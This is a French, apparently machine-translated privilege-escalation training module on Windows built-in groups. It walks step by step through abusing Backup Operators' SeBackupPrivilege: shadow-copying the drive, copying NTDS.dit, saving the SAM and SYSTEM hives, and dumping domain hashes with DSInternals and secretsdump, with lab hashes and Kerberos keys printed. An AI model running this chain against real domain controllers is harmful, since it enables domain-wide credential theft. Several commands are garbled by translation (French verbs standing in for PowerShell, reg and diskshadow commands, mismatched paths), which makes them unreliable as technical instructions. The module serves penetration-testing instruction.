Groupes intégrés Windows
=======================

* * * * *

Comme mentionné dans la section "Présentation des privilèges Windows", les serveurs Windows, et en particulier les contrôleurs de domaine, disposent d'une variété de groupes intégrés qui sont soit livrés avec le système d'exploitation, soit ajoutés lorsque le rôle des services de domaine Active Directory est installé sur un système pour promouvoir un serveur en contrôleur de domaine. Beaucoup de ces groupes confèrent des privilèges spéciaux à leurs membres, et certains peuvent être exploités pour élever les privilèges sur un serveur ou un contrôleur de domaine. [Ici](https://ss64.com/nt/syntax-security_groups.html) est une liste de tous les groupes Windows intégrés avec une description détaillée de chacun. Cette [page](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) contient une liste détaillée des comptes et groupes privilégiés dans Active Directory. Il est essentiel de comprendre les implications de l'appartenance à chacun de ces groupes, que nous accédions à un compte membre de l'un d'entre eux ou que nous remarquions une appartenance excessive/inutile à un ou plusieurs de ces groupes lors d'une évaluation. Pour nos besoins, nous nous concentrerons sur les groupes intégrés suivants. Chacun de ces groupes existe sur les systèmes depuis Server 2008 R2 jusqu'à aujourd'hui, à l'exception des administrateurs Hyper-V (introduits avec Server 2012).

Des comptes peuvent être attribués à ces groupes pour appliquer le moindre privilège et éviter de créer davantage d'administrateurs de domaine et d'administrateurs d'entreprise pour effectuer des tâches spécifiques, telles que des sauvegardes. Parfois, les applications des fournisseurs nécessitent également certains privilèges, qui peuvent être accordés en attribuant un compte de service à l'un de ces groupes. Des comptes peuvent également être ajoutés accidentellement ou après avoir testé un outil ou un script spécifique. Nous devons toujours vérifier ces groupes et inclure une liste des membres de chaque groupe en annexe dans notre rapport pour que le client puisse l'examiner et déterminer si l'accès est toujours nécessaire.

| | | |
| --- | --- | --- |
| [Opérateurs de sauvegarde](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) | [Lecteurs du journal des événements](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins) |
| [Administrateurs Hyper-V](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Opérateurs d'impression](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators) | [Opérateurs de serveur](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |

* * * * *

Opérateurs de sauvegarde
----------------

Après avoir atterri sur une machine, nous pouvons utiliser la commande `whoami /groups` pour afficher nos appartenances actuelles aux groupes. Examinons le cas où nous sommes membre du groupe `Backup Operators` . L'adhésion à ce groupe accorde à ses membres les privilèges `SeBackup` et `SeRestore` . Le [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) nous permet de parcourir n'importe quel dossier et de répertorier le contenu du dossier. Cela nous permettra de copier un fichier à partir d'un dossier, même s'il n'y a pas d'entrée de contrôle d'accès (ACE) pour nous dans la liste de contrôle d'accès (ACL) du dossier. Cependant, nous ne pouvons pas le faire en utilisant la commande de copie standard. Au lieu de cela, nous devons copier les données par programmation, en veillant à spécifier l'indicateur [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea).

Nous pouvons utiliser ce [PoC](https://github.com/giuliano108/SeBackupPrivilege) pour exploiter le `SeBackupPrivilege` et copier ce fichier. Tout d'abord, importons les bibliothèques dans une session PowerShell.

#### Importation de bibliothèques

Importation de bibliothèques

```
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

```

#### Vérification que SeBackupPrivilege est activé

Vérifions si `SeBackupPrivilege` est activé en appelant `whoami /priv` ou `Get-SeBackupPrivilege` applet de commande. Si le privilège est désactivé, nous pouvons l'activer avec `Set-SeBackupPrivilege`.

Remarque : en fonction des paramètres du serveur, il peut être nécessaire de générer une invite CMD élevée pour contourner l'UAC et disposer de ce privilège.

Vérifier que SeBackupPrivilege est activé

```
PS C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= ========= ========
SeMachineAccountPrivilege Ajouter des postes de travail au domaine Désactivé
SeBackupPrivilege Sauvegarder des fichiers et des répertoires Désactivé
SeRestorePrivilege Restaurer les fichiers et le répertoiresecteurs désactivés
SeShutdownPrivilege Arrêter le système Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé

```

Vérifier que SeBackupPrivilege est activé

```
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege est désactivé

```

#### Activation de SeBackupPrivilege

Si le privilège est désactivé, nous pouvons l'activer avec `Set-SeBackupPrivilege`.

Activation de SeBackupPrivilege

```
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege est activé

```

Activation de SeBackupPrivilege

```
PS C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= ========= ========
SeMachineAccountPrivilege Ajouter des postes de travail au domaine Désactivé
SeBackupPrivilege Sauvegarder des fichiers et des répertoires Activé
SeRestorePrivilege Restaurer les fichiers et les répertoires Désactivé
SeShutdownPrivilege Arrêter le système Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé

```

#### Copie d'un fichier protégé

Comme nous pouvons le voir ci-dessus, le privilège a été activé avec succès. Ce privilège peut désormais être utilisé pour copier n'importe quel fichier protégé.

Copie d'un fichier protégé

```
PS C:\htb> répertoire C:\Confidentiel

     Répertoire : C:\Confidentiel

Mode LastWriteTime Longueur Nom
---- ------------- ------ ----
-a---- 06/05/2021 13:01 88 Contrat 2021.txt

PS C:\htb> cat 'C:\Confidentiel\2021 Contract.txt'

cat : L'accès au chemin 'C:\Confidential\2021 Contract.txt' est refusé.
A la ligne:1 car:1
+ cat 'C:\Confidentiel\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo : PermissionDenied : (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
    izedAccessException
     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

```

Copie d'un fichier protégé

```
PS C:\htb> Copier-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copié 88 octets

PS C:\htb> cat .\Contract.txt

Contrat Inlanefreight 2021

==============================

Conseil d'administration:

<...SNIP...>

```

Les commandes ci-dessus montrent comment les informations sensibles ont été accédées sans posséder les autorisations requises.

#### Attaque d'un contrôleur de domaine - Copie de NTDS.dit

Ce groupe permet également de se connecter localement à un contrôleur de domaine. La base de données Active Directory `NTDS.dit` est une cible très attrayante, car elle contient les hachages NTLM pour tous les objets utilisateur et ordinateur du domaine. Cependant, ce fichier est verrouillé et n'est pas non plus accessible aux utilisateurs non privilégiés.

Comme le fichier `NTDS.dit` est verrouillé par défaut, nous pouvons utiliser l'utilitaire Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) pour créez un cliché instantané du lecteur `C` et exposez-le en tant que lecteur `E` . Le NTDS.dit dans ce cliché instantané ne sera pas utilisé par le système.

Attaque d'un contrôleur de domaine - Copie de NTDS.dit

```
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
Sur ordinateur : DC, 14/10/2020 00:57:52

DISKSHADOW> activer le mode verbeux
DISKSHADOW> définir les métadonnées C:\Windows\Temp\meta.cab
DISKSHADOW> définir le contexte accessible au client
DISKSHADOW> définir le contexte persistant
DISKSHADOW> commencer la sauvegarde
DISKSHADOW> ajouter le volume C: alias cdrive
DISKSHADOW> créer
DISKSHADOW> exposer %cdrive% E :
DISKSHADOW> terminer la sauvegarde
DISKSHADOW> quitter

PS C:\htb> répertoire E :

     Annuaire : E :

Mode LastWriteTime Longueur Nom
---- ------------- ------ ----
d----- 06/05/2021 13:00 Confidentiel
d----- 15/09/2018 00:19 PerfLogs
d-r--- 24/03/2021 18:20 Fichiers de programme
d----- 15/09/2018 02h06 Fichiers de programme (x86)
d----- 06/05/2021 13:05 Outils
d-r--- 06/05/2021 12:51 Utilisateurs
d----- 24/03/2021 18:38 Fenêtres

```

#### Copier NTDS.dit localement

Ensuite, nous pouvons utiliser l'applet de commande `Copy-FileSeBackupPrivilege` pour contourner l'ACL et copier le NTDS.dit localement.

Copier NTDS.dit localement

```
PS C:\htb> Copier-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copié 16777216 octets

```

#### Sauvegarde des ruches de registre SAM et SYSTEM

Le privilège nous permet également de sauvegarder les ruches de registre SAM et SYSTEM, que nous pouvons extraire hors ligne des informations d'identification du compte local à l'aide d'un outil tel que "secretsdump.py" d'Impacket.

Sauvegarde des ruches de registre SAM et SYSTEM

```
C:\htb> enregistrer HKLM\SYSTEM SYSTEM.SAV

L'opération s'est bien déroulée.

C:\htb> enregistrer HKLM\SAM SAM.SAV

L'opération comterminé avec succès.

```

Il convient de noter que si un dossier ou un fichier a une entrée de refus explicite pour notre utilisateur actuel ou un groupe auquel il appartient, cela nous empêchera d'y accéder, même si l'indicateur `FILE_FLAG_BACKUP_SEMANTICS` est spécifié.

#### Extraction des informations d'identification de NTDS.dit

Avec le NTDS.dit extrait, nous pouvons utiliser un outil tel que `secretsdump.py` ou le module PowerShell `DSInternals` pour extraire toutes les informations d'identification du compte Active Directory. Obtenons le hachage NTLM uniquement pour le compte `administrateur` du domaine à l'aide de `DSInternals`.

Extraction des informations d'identification de NTDS.dit

```
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrateur,CN=utilisateurs,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

Nom unique : CN=Administrateur,CN=Utilisateurs,DC=INLANEFREIGHT,DC=LOCAL
Sid : S-1-5-21-669053619-2741956077-1013132368-500
Guide : f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName : administrateur
SamAccountType : Utilisateur
UserPrincipalName :
ID de groupe principal : 513
SidHistory :
Activé : Vrai
UserAccountControl : NormalAccount, PasswordNeverExpires
Nombre d'administrateurs : vrai
Supprimé : faux
Date de dernière connexion : 06/05/2021 17:40:30
Afficher un nom:
Prénom:
Nom de famille:
Description : compte intégré pour l'administration de l'ordinateur/du domaine
ServicePrincipalName :
SecurityDescriptor : DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscrétionnaireAclProtégée, Auto-parentale
Propriétaire : S-1-5-21-669053619-2741956077-1013132368-512
secrets
   NTHash : cf3a5525ee9414229e66279623ed5c58
   LMHash :
   NTHashHistory :
   LMHashHistory :
   Informations d'identification supplémentaires :
     Effacer le texte:
     NTLMStrongHash : 7790d8406b55c380f98b92bb2fdc63a7
     Kerberos :
       Crédits:
         DES_CBC_MD5
           Clé : d60dfbbf20548938
       Anciennes informations d'identification :
       Sel : WIN-NB4NGP3TKNKAdministrateur
       Drapeaux : 0
     KerberosNouveau :
       Crédits:
         AES256_CTS_HMAC_SHA1_96
           Clé : 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
           Itérations : 4096
         AES128_CTS_HMAC_SHA1_96
           Clé : 94c300d0e47775b407f2496a5cca1a0a
           Itérations : 4096
         DES_CBC_MD5
           Clé : d60dfbbf20548938
           Itérations : 4096
       Anciennes informations d'identification :
       Anciens identifiants :
       Identifiants de service :
       Sel : WIN-NB4NGP3TKNKAdministrateur
       Nombre d'itérations par défaut : 4 096
       Drapeaux : 0
     WDigest :
Identifiants clés :
Itinérance des identifiants
   Créé:
   Modifié:
   Crédits:

```

#### Extraction de hachages à l'aide de SecretsDump

Nous pouvons également utiliser `SecretsDump` hors ligne pour extraire les hachages du fichier `ntds.dit` obtenu précédemment. Ceux-ci peuvent ensuite être utilisés pour transmettre le hachage afin d'accéder à des ressources supplémentaires ou être piratés hors ligne à l'aide de `Hashcat` pour obtenir un accès supplémentaire. En cas de piratage, nous pouvons également présenter au client des statistiques de piratage de mot de passe pour lui fournir un aperçu détaillé de la force et de l'utilisation globales du mot de passe dans son domaine et fournir des recommandations pour améliorer sa politique de mot de passe (augmentation de la longueur minimale, création d'un dictionnaire de mots interdits, etc. ).

Extraction de hachages à l'aide de SecretsDump

```
dsgsec@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Clé de démarrage du système cible : 0xc0a9116f907bd37afaaa845cb87d0550
[*] Vidage des identifiants de domaine (domain\uid:rid:lmhash:nthash)
[*] Recherche de pekList, soyez patient
[*] PEK # 0 trouvé et décrypté : 85541c20c346e3198a3ae2c09df7f330
[*] Lecture et décryptage des hachages de ntds.dit
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 :::
Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 :::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484 :::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129 :::
htb-étudiant:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5 :::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 :::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 :::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 :::
printvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 :::

<SNIP>

```

* * * * *

Robocopie
--------

#### Copier des fichiers avec Robocopy

L'utilitaire intégré [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) peut également être utilisé pour copier des fichiers en mode de sauvegarde. Robocopy est un outil de réplication d'annuaire en ligne de commande. Il peut être utilisé pour créer des tâches de sauvegarde et inclut des fonctionnalités telles que la copie multithread, la nouvelle tentative automatique, la possibilité de reprendre la copie, etc. Robocopy diffère de la commande `copy` en ce sens qu'au lieu de simplement copier tous les fichiers, il peut vérifier le répertoire de destination et supprimer les fichiers qui ne se trouvent plus dans le répertoire source.ry. Il peut également comparer les fichiers avant de les copier pour gagner du temps en ne copiant pas les fichiers qui n'ont pas été modifiés depuis la dernière tâche de copie/sauvegarde exécutée.

Copier des fichiers avec Robocopy

```
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------- -----------------------------
    ROBOCOPY :: Copie de fichiers robuste pour Windows
-------------------------------------------------- -----------------------------

   Début : jeudi 6 mai 2021 13:11:47
    Source : E:\Windows\NTDS\
      Destination : C:\Tools\ntds

     Fichiers : ntds.dit

   Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

-------------------------------------------------- -------------------------------------

           Nouveau répertoire 1 E:\Windows\NTDS\
100 % nouveau fichier 16,0 m ntds.dit

-------------------------------------------------- -------------------------------------

                Total copié non concordance ignoré Extras ÉCHEC
     Rép : 1 1 0 0 0 0
    Fichiers : 1 1 0 0 0 0
    Octets : 16.00 m 16.00 m 0 0 0 0
    Heures : 0:00:00 0:00:00 0:00:00 0:00:00

    Vitesse : 356962042 Octets/sec.
    Vitesse : 20425.531 MegaBytes/min.
    Terminé : jeudi 6 mai 2021 13:11:47

```

Cela élimine le besoin d'outils externes.